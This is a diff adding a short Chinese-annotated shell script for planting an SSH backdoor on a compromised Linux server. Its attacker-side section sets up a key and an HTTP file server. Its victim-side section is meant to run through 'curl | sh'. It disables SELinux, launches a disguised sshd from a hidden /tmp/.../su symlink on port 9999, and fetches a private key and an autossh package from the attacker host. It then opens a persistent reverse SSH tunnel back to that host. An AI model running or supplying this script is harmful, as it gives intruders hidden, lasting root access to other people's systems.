@@ -1,0 +1,29 @@
+-----------在攻击机执行内容------------------
+useradd test
+passwd test
+su test
+ssh-keygen -t rsa
+chmod 700 ~/.ssh/
+cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+nohup python -m SimpleHTTPServer 8000 > /dev/null 2>&1 &
+exit
+usermod -s /usr/sbin/nologin test
+
+
+
+-----------在受害机执行内容------------------可以“curl -fsSL 这个脚本|sh”来执行 autossh用作断开自动回连,我的ssh是80端口
+setenforce 0 2>/dev/null
+ulimit -n 50000
+ulimit -u 50000
+mkdir /tmp/.../;ln -sf /usr/sbin/sshd /tmp/.../su;/tmp/.../su -oPort=9999
+curl http://攻击机:8000/id_rsa >> /root/.ssh/id_rsa
+chmod 700 /root/.ssh/
+chmod 600 /root/.ssh/id_rsa
+sed -i 's/#RSAAuthentication/RSAAuthentication/' /etc/ssh/sshd_config
+sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/' /etc/ssh/sshd_config
+sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile/' /etc/ssh/sshd_config
+service sshd restart
+yum install -y autossh
+rpm -ivh http://攻击机:8000/autossh-1.4c-2.el6.x86_64.rpm
+autossh -p 80 -M 10002 -NR 10228:localhost:9999 bll@攻击机  -o "ServerAliveInterval 15" -o "ServerAliveCountMax 10" -o "StrictHostKeyChecking=false" -i /root/.ssh/id_rsa
